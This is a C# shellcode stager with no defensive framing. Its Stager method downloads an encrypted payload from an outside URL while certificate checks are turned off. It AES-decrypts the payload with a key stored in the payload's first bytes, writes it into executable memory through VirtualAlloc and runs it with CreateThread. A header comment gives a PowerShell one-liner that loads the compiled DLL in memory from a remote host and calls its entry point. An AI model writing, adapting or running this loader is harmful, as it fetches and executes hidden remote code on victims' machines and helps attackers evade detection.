using System;
using System.Configuration.Install;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

//  [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://x.x.x.x/run.dll'));[ClassName.Class1]::Main()


namespace ClassName
{
    public class Class1
    {

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);



        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        public static void Main()
        {
            string url = "https://xyz.ca/notification.bin";
            Stager(url);
        }

        public static void Stager(string url)
        {
            byte[] encryptedData;

            WebClient wc = new WebClient();
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            encryptedData = wc.DownloadData(url);

            byte[] key = new byte[16];
            byte[] encryptedShellcode = new byte[encryptedData.Length - 16];
            Array.Copy(encryptedData, 0, key, 0, 16);
            Array.Copy(encryptedData, 16, encryptedShellcode, 0, encryptedData.Length - 16);

            byte[] decryptedShellcode = aesDecrypt(encryptedShellcode, key);

            UInt32 codeAddr = VirtualAlloc(0, (UInt32)decryptedShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(decryptedShellcode, 0, (IntPtr)(codeAddr), decryptedShellcode.Length);

            IntPtr threadHandle = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr parameter = IntPtr.Zero;
            threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);


        }

        private static byte[] aesDecrypt(byte[] cipher, byte[] key)
        {
            byte[] IV = new byte[16];

            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 256;
                aes.Key = SHA256.Create().ComputeHash(key);
                aes.IV = IV;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipher, 0, cipher.Length);
                        cs.FlushFinalBlock();
                    }

                    return ms.ToArray();
                }
            }
        }
    }
}

